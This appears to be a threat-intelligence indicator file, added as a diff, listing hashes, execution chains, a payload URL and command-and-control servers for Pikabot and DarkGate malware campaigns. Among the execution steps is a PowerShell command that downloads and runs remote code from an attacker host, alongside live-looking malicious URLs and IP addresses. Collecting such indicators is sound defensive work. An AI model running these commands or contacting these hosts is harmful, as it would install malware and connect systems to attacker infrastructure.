@@ -1,0 +1,61 @@
+26.03.2024 | Pikabot | 1.8.32-beta | Darkgate | admin888
+
+*************************************************
+
+.xlsx 26e6ef9ef726f82c502a9b433ca07fa763d1cbac163236daac3c18a337245f29
+.html 196bb36f7d63c845afd40c5c17ce061e320d110f28ebe8c7c998b9e6b3fe1005
+.js b26eea12f0335364ffc49ecd7b04865d451f4f227724458ce1412cfd841350ee
+.vbs cb65d95a1496fd2e5105954eb3046df90c4262f19fa7d7d77fa59b488348b040
+.exe 7d18e238febf88bc7c868e3ee4189fd12a2aa4db21f66151bb4c15c0600eca6e
+
+*************************************************
+
+Pikabot Exec >>
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\document_03.26.js
+
+C:\users\public\vx.exe
+
+ctfmon.exe -p 1234"
+
+*************************************************
+
+Darkgate Exec >>
+
+WScript.exe C:\Users\Admin\AppData\Local\Microsoft\Windows\INetCache\IE\J1T8VYEI\Report-26-2024[1].vbs
+
+powershell.exe -Command Invoke-Expression (Invoke-RestMethod -Uri 'withupdate.com/zuyagaoq')
+
+AutoHotkey.exe C:/rjtu/script.ahk 
+
+attrib.exe +h C:/rjtu/
+
+*************************************************
+
+https://ingatecsus.com.br/assumendaipsam/Point.exe
+
+*************************************************
+
+Darkgate c2's
+
+.xlsx 
+
+http://backupitfirst.com/wgfqneerod
+
+.html
+
+http://withupdate.com/oudowibspr
+
+*************************************************
+
+Pikabot c2's
+
+https://158.220.95.214:5243
+https://64.23.199.206:1194
+https://172.232.208.90:2223
+https://213.199.41.33:13721
+https://194.233.91.144:5000
+https://158.220.95.215:5242
+https://84.247.157.112:13783
+
+*************************************************
